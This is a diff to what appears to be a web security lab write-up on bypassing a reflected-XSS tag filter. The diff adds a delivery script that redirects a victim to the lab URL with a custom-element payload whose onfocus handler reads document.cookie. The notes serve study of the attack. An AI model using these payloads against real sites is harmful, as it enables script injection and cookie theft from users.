@@ -34,6 +34,10 @@ Reflected XSS / Filter Bypass
 
 <xss id=x tabindex=1 autofocus onfocus=alert(1) >
 
+Exploite: <script>
+location='https://0ab50023037640ad82a697ed00290028.web-security-academy.net/?search=<xss id=x tabindex=1 onfocus=alert(document.cookie) autofocus></xss>';
+</script>
+
 ## Result
 Successfully bypassed the HTML tag filter using a custom HTML element and executed arbitrary JavaScript.
 
